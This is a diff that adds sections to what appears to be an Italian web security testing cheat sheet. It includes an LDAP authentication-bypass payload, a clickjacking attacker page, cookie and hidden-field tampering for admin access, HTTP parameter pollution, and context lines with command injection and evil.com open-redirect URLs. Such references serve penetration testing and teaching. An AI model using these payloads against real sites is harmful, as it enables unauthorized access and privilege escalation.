@@ -97,6 +97,12 @@ $(whoami)
 ```
 *)(uid=*))(|(uid=*
 admin)(&)
+*)(&
+admin)(|(password=*)
+
+# Bypass autenticazione
+user=*)(&password=*
+# Query diventa: (&(user=*)(&password=*)(password=input))
 ```
 
 ### XPath Injection
@@ -134,6 +140,47 @@ eval()
 ```
 https://target.com/redirect?url=https://evil.com
 https://target.com/redirect?url=//evil.com
+```
+
+### Clickjacking
+
+```html
+<!-- Attacker page -->
+<iframe src="https://target.com/sensitive-action" style="opacity:0;position:absolute;"></iframe>
+<button style="position:relative;">Click me!</button>
+
+<!-- Test: se X-Frame-Options manca, vulnerabile -->
+```
+
+### Cookie Manipulation
+
+```
+# Modifica cookie per privilege escalation
+Cookie: role=admin; user_id=1
+
+# Cookie senza flag Secure/HttpOnly
+# Accessibile via JavaScript o sniffing
+```
+
+### Parameter Pollution (HPP)
+
+```
+# HTTP Parameter Pollution
+GET /transfer?amount=100&amount=10000
+# Backend potrebbe usare secondo valore
+
+# Tool: OWASP ZAP per detection
+```
+
+### Hidden Elements
+
+```html
+<!-- Elementi nascosti nel DOM -->
+<input type="hidden" name="admin" value="false">
+<!-- Modifica in true via DevTools -->
+
+<!-- Comments nel source code -->
+<!-- TODO: remove debug password: admin123 -->
 ```
 
 ---
@@ -249,6 +296,19 @@ def withdraw():
 
 threads = [threading.Thread(target=withdraw) for _ in range(10)]
 for t in threads: t.start()
+
+# Tool: Turbo Intruder in Burp Suite
+```
+
+### Lack of Code Signing
+
+```
+# Applicazioni senza firma digitale
+# Verificare:
+- Binaries non firmati
+- Scripts non verificati
+- Updates senza signature check
+- Mobile apps con certificate self-signed
 ```
 
 ---
